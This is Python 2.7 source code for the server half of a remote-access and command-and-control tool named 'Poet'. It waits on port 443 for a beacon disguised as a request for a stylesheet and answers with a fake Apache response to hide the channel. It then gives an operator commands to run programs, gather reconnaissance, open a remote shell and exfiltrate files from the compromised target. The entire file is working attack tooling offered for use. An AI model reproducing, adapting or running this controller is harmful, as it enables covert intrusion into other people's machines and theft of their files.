#!/usr/bin/python2.7

import re
import sys
import base64
import socket
import os.path
import argparse
from datetime import datetime

OUT = 'archive'
SBUF_LEN = 9
SIZE = 4096
PSH_PROMPT = 'psh > '
FAKEOK = """HTTP/1.1 200 OK\r
Date: Tue, 19 Mar 2013 22:12:25 GMT\r
Server: Apache\r
X-Powered-By: PHP/5.3.10-1ubuntu3.2\r
Content-Length: 364\r
Content-Type: text/plain\r
\r
body{background-color:#f0f0f2;margin:0;padding:0;font-family:"Open Sans","Helvetica Neue",Helvetica,Arial,sans-serif}div{width:600px;margin:5em auto;padding:50px;background-color:#fff;border-radius:1em}a:link,a:visited{color:#38488f;text-decoration:none}@media (max-width:700px){body{background-color:#fff}div{width:auto;margin:0 auto;border-radius:0;padding:1em}}"""


def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port')
    return parser.parse_args()


def shell_server(s, PORT):
    cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil']
    print '[+] ({}) Entering control shell'.format(datetime.now())
    conn, addr = s.accept()
    prompt = shell_exchange(conn, 'getprompt')
    print 'Welcome to psh, the poet shell!'
    print 'Running `help\' will give you a list of supported commands.'
    while True:
        try:
            inp = raw_input(PSH_PROMPT)
            if inp == '':
                continue
            base = inp.split()[0]
            # exit
            if inp == cmds[0]:
                break
            # help
            elif base == cmds[1]:
                print 'Commands:'
                for cmd in cmds:
                    print '  {}'.format(cmd)
            # exec
            elif base == cmds[2]:
                inp += ' '  # for regex
                exec_regex = '^exec ((("[^"]+")|(-o( [\w.]+)?))\ )+$'
                if re.search(exec_regex, inp) and '"' in inp:
                    shell_generic(conn, *shell_exec_preproc(inp))
                else:
                    shell_cmd_help(cmds, 2)
            # recon
            elif base == cmds[3]:
                if re.search('^recon( -o( [\w.]+)?)?$', inp):
                    if '-o' in inp.split():
                        if len(inp.split()) == 3:
                            shell_generic(conn, base, True, inp.split()[2])
                        else:
                            shell_generic(conn, base, True)
                    else:
                        shell_generic(conn, base)
                else:
                    shell_cmd_help(cmds, 3)
            # shell
            elif base == cmds[4]:
                if inp == 'shell':
                    shell_shell(conn, prompt)
                else:
                    shell_cmd_help(cmds, 4)
            # exfil
            elif base == cmds[5]:
                if re.search('^exfil ([\w\/.~]+ )+$', inp + ' '):
                    for file in inp.split():
                        if file == 'exfil':
                            continue
                        resp = shell_exchange(conn, 'exfil ' + file)
                        if 'No such' in resp:
                            print 'psh : {}: {}'.format(resp, file)
                            continue
                        shell_write(resp, base, OUT,
                                    file.split('/')[-1].strip('.'))
                else:
                    shell_cmd_help(cmds, 5)
            else:
                print 'psh: {}: command not found'.format(base)
        except KeyboardInterrupt:
            print
            continue
        except EOFError:
            print
            break
    socksend(conn, 'fin')
    print '[+] ({}) Exiting control shell.'.format(datetime.now())


def shell_generic(s, req, write_flag=False, write_file=None):
    resp = shell_exchange(s, req)
    print resp
    if write_flag:
        shell_write(resp, req.split()[0], OUT, write_file)


def shell_write(response, prefix, out_dir, write_file=None):
    ts = datetime.now().strftime('%Y%m%d%M%S')
    out_ts_dir = '{}/{}'.format(out_dir, ts[:len('20140101')])
    out_prefix_dir = '{}/{}'.format(out_ts_dir, prefix)
    if write_file:
        outfile = '{}/{}'.format(out_prefix_dir, write_file)
    else:
        outfile = '{}/{}-{}.txt'.format(out_prefix_dir, prefix, ts)
    response = '{}\n\n{}'.format(datetime.now(), response)
    if not os.path.isdir(out_dir):
        os.mkdir(out_dir)
    if not os.path.isdir(out_ts_dir):
        os.mkdir(out_ts_dir)
    if not os.path.isdir(out_prefix_dir):
        os.mkdir(out_prefix_dir)
    with open(outfile, 'w') as f:
        f.write(response)
        print 'psh : {} written to {}'.format(prefix, outfile)


def shell_cmd_help(cmds, ind):
    if ind == 2:
        print 'Execute commands on target.'
        print 'usage: exec [-o [filename]] "cmd1" ["cmd2" "cmd3" ...]'
        print '\nExecute given commands and optionally log to file with optional filename.'
        print '\noptions:'
        print '-h\t\tshow help'
        print '-o filename\twrite results to file in {}/'.format(OUT)
    elif ind == 3:
        print 'Basic reconaissance of target.'
        print 'usage: recon [-h] [-o]'
        print '\nExecutes, whoami, id, w, who -a, uname -a, and lsb_release -a on target where applicable.'
        print '\noptions:'
        print '-h\t\tshow help'
        print '-o\t\twrite results to file in {}/'.format(OUT)
    elif ind == 4:
        print 'Basic shell on target (forwards stdout of commands executed).'
        print 'usage: shell [-h]'
        print '\noptions:'
        print '-h\t\tshow help'
    elif ind == 5:
        print 'Exfiltrate files.'
        print 'usage: exfil [-h] file1 [file2 file3 ...]'
        print '\nDownloads files to {}/'.format(OUT)
        print '\noptions:'
        print '-h\t\tshow help'


def shell_exec_preproc(inp):
    # normalize
    tmp = inp.replace('-o', '').replace('  ', ' ')
    tmp = tmp.split()
    # find potential custom filename
    write_file = None
    for i, each in enumerate(tmp):
        if each != 'exec' and '"' not in each:
            write_file = each
            del tmp[i]
    tmp = ' '.join(tmp)
    write_flag = '-o' in inp.split()
    return tmp, write_flag, write_file


def shell_shell(s, prompt):
    pass
    while True:
        try:
            inp = raw_input(PSH_PROMPT + prompt)
            if inp == '':
                continue
            elif inp == 'exit':
                break
            else:
                print shell_exchange(s, 'shell {}'.format(inp))
        except KeyboardInterrupt:
            print
            continue
        except EOFError:
            print
            break


def shell_exchange(conn, req):
    socksend(conn, req)
    return sockrecv(conn)


def socksend(s, msg):
    """
        Sends message using socket operating under the convention that the
        first five bytes received are the size of the following message.
    """

    pkg = base64.b64encode(msg)
    fmt = '{:0>%dd}' % SBUF_LEN
    pkg_size = fmt.format(len(pkg))
    if len(pkg_size) > SBUF_LEN:
        raise socket.error('too much data!')
    pkg = pkg_size + pkg
    sent = s.sendall(pkg)
    if sent:
        raise socket.error('socket connection broken')


def sockrecv(s):
    """
        Receives message from socket operating under the convention that the
        first five bytes received are the size of the following message.
        Returns the message.

        TODO: Under high network loads, it's possible that the initial recv
        may not even return the first 9 bytes so another loop is necessary
        to ascertain that.
    """

    chunks = []
    bytes_recvd = 0
    initial = s.recv(SIZE)
    if not initial:
        raise socket.error('socket connection broken')
    msglen, initial = (int(initial[:SBUF_LEN]), initial[SBUF_LEN:])
    bytes_recvd = len(initial)
    chunks.append(initial)
    while bytes_recvd < msglen:
        chunk = s.recv(min((msglen - bytes_recvd, SIZE)))
        if not chunk:
            raise socket.error('socket connection broken')
        chunks.append(chunk)
        bytes_recvd += len(chunk)
    return base64.b64decode(''.join(chunks))


def main():
    args = get_args()
    PORT = int(args.port) if args.port else 443

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', PORT))
    s.listen(1)

    print '[+] Poet server started on {}.'.format(PORT)
    conn, addr = s.accept()
    print '[i] Connected By: {} at {}'.format(addr, datetime.now())
    ping = conn.recv(SIZE)
    if not ping:
        raise socket.error('socket connection broken')
    if ping.startswith('GET /style.css HTTP/1.1'):
        conn.send(FAKEOK)
        conn.close()
        try:
            shell_server(s, PORT)
        except socket.error as e:
            print '[!] ({}) Socket error: {}'.format(datetime.now(), e.message)
            print '[-] ({}) Poet terminated.'.format(datetime.now())
            sys.exit(0)
    print '[-] ({}) Poet terminated.'.format(datetime.now())

if __name__ == '__main__':
    main()
